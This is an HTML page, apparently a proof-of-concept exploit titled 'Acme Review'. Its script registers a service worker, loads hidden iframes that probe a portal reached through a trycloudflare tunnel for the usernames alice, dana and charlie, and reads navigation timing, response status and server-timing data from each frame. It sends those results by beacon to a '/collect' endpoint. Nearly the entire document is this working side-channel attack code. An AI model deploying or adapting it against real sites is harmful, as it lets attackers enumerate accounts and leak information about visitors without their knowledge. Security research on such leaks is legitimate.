
<!doctype html>
<html lang="ko">
<head>
  <meta charset="utf-8">
  <title>Acme Review</title>
</head>
<body>
<h2>Acme Review</h2>
<pre id="output">Starting...</pre>

<script>
const PORTAL =
  'https://originally-yours-respondents-combined.trycloudflare.com';

const HOOK = '/collect';
const output = document.querySelector('#output');
let started = false;

function log(stage, data = {}) {
  const record = {
    stage,
    data,
    ua: navigator.userAgent
  };

  const payload = JSON.stringify(record);
  output.textContent += '\n' + payload;
  console.log(record);

  navigator.sendBeacon(
    HOOK + '?event=' + encodeURIComponent(stage)
      + '&t=' + Date.now(),
    new Blob([payload], {type: 'text/plain'})
  );
}

function start() {
  if (started) return;
  started = true;

  log('sw-ready');

  for (const username of ['alice', 'dana', 'charlie']) {
    const frame = document.createElement('iframe');
    frame.hidden = true;

    frame.onload = () => {
      try {
        const nav = frame.contentWindow.performance
          .getEntriesByType('navigation')[0];

        log('navigation-timing', {
          username,
          responseStatus: nav?.responseStatus ?? null,
          workerStart: nav?.workerStart ?? null,
          serverTiming: Array.from(
            nav?.serverTiming || [],
            t => ({
              name: t.name,
              description: t.description,
              duration: t.duration
            })
          )
        });
      } catch (e) {
        log('navigation-error', {
          username,
          message: e.message
        });
      }
    };

    frame.src =
      './probe?portal=' + encodeURIComponent(PORTAL)
      + '&username=' + encodeURIComponent(username)
      + '&t=' + Date.now();

    document.body.appendChild(frame);
  }
}

async function main() {
  log('page-opened');

  try {
    navigator.serviceWorker.addEventListener(
      'controllerchange',
      () => {
        if (navigator.serviceWorker.controller) start();
      }
    );

    await navigator.serviceWorker.register(
      './sw.js?v=9',
      {updateViaCache: 'none'}
    );

    await navigator.serviceWorker.ready;

    if (navigator.serviceWorker.controller) {
      start();
    } else if (
      !new URL(location.href).searchParams.has('retry')
    ) {
      const next = new URL(location.href);
      next.searchParams.set('retry', '1');
      location.replace(next);
    } else {
      log('no-controller');
    }
  } catch (e) {
    log('main-error', {message: e.message});
  }
}

main();
</script>
</body>
</html>
